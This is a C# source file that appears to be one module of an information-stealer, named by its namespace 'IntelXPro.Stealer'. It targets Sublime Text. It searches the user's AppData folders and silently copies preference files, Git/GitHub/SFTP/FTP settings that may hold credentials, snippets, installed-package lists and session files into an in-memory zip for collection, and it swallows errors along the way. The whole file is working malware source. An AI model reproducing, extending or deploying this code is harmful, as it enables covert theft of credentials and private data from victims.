using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class SublimeText : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Sublime Text");
            string localAppDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Sublime Text");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "SublimeText";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(localAppDataPath))
            {
                foundData |= CollectFromDirectory(localAppDataPath, "LocalAppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(basePath, "*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);

                    string packagesPath = Path.Combine(versionDir, "Packages");
                    if (Directory.Exists(packagesPath))
                    {
                        string userPath = Path.Combine(packagesPath, "User");
                        if (Directory.Exists(userPath))
                        {
                            string[] configFiles = new string[]
                            {
                                "Preferences.sublime-settings",
                                "Package Control.sublime-settings",
                                "Git.sublime-settings",
                                "GitHub.sublime-settings",
                                "SFTP.sublime-settings",
                                "FTP.sublime-settings"
                            };

                            foreach (string configFile in configFiles)
                            {
                                string fullPath = Path.Combine(userPath, configFile);
                                if (File.Exists(fullPath))
                                {
                                    string zipPath = $"Applications\\SublimeText\\{location}\\{versionName}\\User\\{configFile}";
                                    zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                                    counterApplications.Files.Add(fullPath + " => " + zipPath);
                                    foundData = true;
                                }
                            }

                            string[] snippetFiles = Directory.GetFiles(userPath, "*.sublime-snippet", SearchOption.TopDirectoryOnly);
                            foreach (string file in snippetFiles.Take(10))
                            {
                                string fileName = Path.GetFileName(file);
                                string zipPath = $"Applications\\SublimeText\\{location}\\{versionName}\\User\\snippets\\{fileName}";
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }

                    string installedPackagesPath = Path.Combine(versionDir, "Installed Packages");
                    if (Directory.Exists(installedPackagesPath))
                    {
                        string[] packageFiles = Directory.GetFiles(installedPackagesPath, "*.sublime-package", SearchOption.TopDirectoryOnly);
                        
                        if (packageFiles.Length > 0)
                        {
                            StringBuilder packagesList = new StringBuilder();
                            packagesList.AppendLine("Installed Packages:");
                            packagesList.AppendLine();
                            
                            foreach (string file in packageFiles)
                            {
                                string packageName = Path.GetFileNameWithoutExtension(file);
                                packagesList.AppendLine("- " + packageName);
                            }
                            
                            string zipPath = $"Applications\\SublimeText\\{location}\\{versionName}\\packages_list.txt";
                            zip.AddTextFile(zipPath, packagesList.ToString());
                            counterApplications.Files.Add(zipPath);
                            foundData = true;
                        }
                    }

                    string localPath = Path.Combine(versionDir, "Local");
                    if (Directory.Exists(localPath))
                    {
                        string sessionFile = Path.Combine(localPath, "Session.sublime_session");
                        if (File.Exists(sessionFile))
                        {
                            string zipPath = $"Applications\\SublimeText\\{location}\\{versionName}\\Session.sublime_session";
                            zip.AddFile(zipPath, File.ReadAllBytes(sessionFile));
                            counterApplications.Files.Add(sessionFile + " => " + zipPath);
                            foundData = true;
                        }

                        string autoSavePath = Path.Combine(localPath, "Auto Save Session.sublime_session");
                        if (File.Exists(autoSavePath))
                        {
                            string zipPath = $"Applications\\SublimeText\\{location}\\{versionName}\\Auto Save Session.sublime_session";
                            zip.AddFile(zipPath, File.ReadAllBytes(autoSavePath));
                            counterApplications.Files.Add(autoSavePath + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
